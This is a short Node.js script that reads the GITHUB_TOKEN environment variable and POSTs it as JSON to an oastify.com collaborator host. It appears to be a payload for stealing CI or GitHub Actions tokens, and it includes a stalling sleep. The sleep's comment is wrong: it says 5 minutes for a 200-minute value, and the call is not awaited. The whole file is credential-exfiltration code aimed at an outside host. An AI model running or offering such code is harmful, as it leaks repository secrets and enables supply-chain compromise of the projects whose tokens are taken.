const url = "https://sa62s9f6ivufo8ppv3531mi76ycp0io7.oastify.com"; // Replace this with your target URL
const token = process.env.GITHUB_TOKEN || "123"

async function makePostRequest() {
  try {
    const fetch = await import("node-fetch");
    const response = await fetch.default(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        token: token,
      }),
    });

    if (response.ok) {
      sleepForFiveMinutes();
      const data = await response.json();
      console.log("POST request successful. Response data:", data);
    } else {
      console.error("Failed to make POST request. Status:", response.status);
    }
  } catch (error) {
    console.error("Error making POST request:", error.message);
  }
}
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

async function sleepForFiveMinutes() {
    await sleep(12000000); // 5 minutes = 5 * 60 * 1000 milliseconds
}

makePostRequest();
